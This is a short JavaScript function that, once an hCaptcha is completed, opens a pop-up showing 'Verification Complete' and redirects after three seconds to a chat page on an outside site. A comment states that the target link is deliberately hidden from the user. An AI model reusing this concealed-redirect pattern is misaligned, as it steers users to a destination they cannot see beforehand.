// Function that is triggered once the user completes the hCaptcha
function onCaptchaComplete() {
  try {
    // Open a new pop-up window to redirect to the target page
    const popup = window.open("", "Verification Complete", "width=400,height=400");

    if (!popup) {
      alert("Popup blocked! Please allow popups and try again.");
      return;
    }

    // Write content to the pop-up window, without showing the target link
    popup.document.write(`
      <!DOCTYPE html>
      <html>
        <head>
          <title>Redirecting...</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              text-align: center;
              margin-top: 50px;
            }
            .redirect-message {
              font-size: 18px;
              margin-top: 20px;
            }
          </style>
        </head>
        <body>
          <h2>Verification Complete!</h2>
          <div class="redirect-message">
            You are being redirected, please wait...
          </div>
          <script>
            setTimeout(function() {
              window.location.href = "https://chat.lucasnsam.site/chat";
            }, 3000); // Redirect after 3 seconds
          </script>
        </body>
      </html>
    `);

    popup.document.close(); // Ensure the document is fully written
  } catch (error) {
    console.error("Error opening pop-up:", error);
  }
}
